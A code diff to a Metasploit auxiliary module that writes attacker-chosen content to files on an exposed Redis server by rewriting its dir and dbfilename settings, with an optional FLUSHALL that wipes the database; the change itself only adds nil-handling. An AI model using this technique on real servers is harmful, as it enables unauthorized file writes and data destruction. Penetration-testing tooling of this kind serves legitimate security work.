@@ -1,9 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Redis
@@ -55,18 +53,18 @@ class MetasploitModule < Msf::Auxiliary
     # Get the currently configured dir and dbfilename before we overwrite them;
     # we should set them back to their original values after we are done.
     # XXX: this is a hack -- we should really parse the responses more correctly
-    original_dir = redis_command('CONFIG', 'GET', 'dir').split(/\r\n/).last
-    original_dbfilename = redis_command('CONFIG', 'GET', 'dbfilename').split(/\r\n/).last
+    original_dir = (redis_command('CONFIG', 'GET', 'dir') || '').split(/\r\n/).last
+    original_dbfilename = (redis_command('CONFIG', 'GET', 'dbfilename') || '').split(/\r\n/).last
     if datastore['DISABLE_RDBCOMPRESSION']
-      original_rdbcompression = redis_command('CONFIG', 'GET', 'rdbcompression').split(/\r\n/).last
+      original_rdbcompression = (redis_command('CONFIG', 'GET', 'rdbcompression') || '').split(/\r\n/).last
     end
 
     # set the directory which stores the current redis local store
-    data = redis_command('CONFIG', 'SET', 'dir', dirname)
+    data = redis_command('CONFIG', 'SET', 'dir', dirname) || ''
     return unless data.include?('+OK')
 
     # set the file name, relative to the above directory name, that is the redis local store
-    data = redis_command('CONFIG', 'SET', 'dbfilename', basename)
+    data = redis_command('CONFIG', 'SET', 'dbfilename', basename) || ''
     return unless data.include?('+OK')
 
     # Compression string objects using LZF when dump .rdb databases ?
@@ -75,7 +73,7 @@ class MetasploitModule < Msf::Auxiliary
     # the dataset will likely be bigger if you have compressible values or
     # keys.
     if datastore['DISABLE_RDBCOMPRESSION'] && original_rdbcompression.upcase == 'YES'
-      data = redis_command('CONFIG', 'SET', 'rdbcompression', 'no')
+      data = redis_command('CONFIG', 'SET', 'rdbcompression', 'no') || ''
       if data.include?('+OK')
         reset_rdbcompression = true
       else
@@ -85,7 +83,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if datastore['FLUSHALL']
-      data = redis_command('FLUSHALL')
+      data = redis_command('FLUSHALL') || ''
       unless data.include?('+OK')
         print_warning("#{peer} -- failed to flushall(); continuing")
       end
@@ -96,9 +94,9 @@ class MetasploitModule < Msf::Auxiliary
     # multiline.  It also probably doesn't work well if the content isn't
     # simple ASCII text
     key = Rex::Text.rand_text_alpha(32)
-    data = redis_command('SET', key, content)
+    data = redis_command('SET', key, content) || ''
     return unless data.include?('+OK')
-    data = redis_command('SAVE')
+    data = redis_command('SAVE') || ''
 
     if data.include?('+OK')
       print_good("#{peer} -- saved #{content.size} bytes inside of redis DB at #{path}")
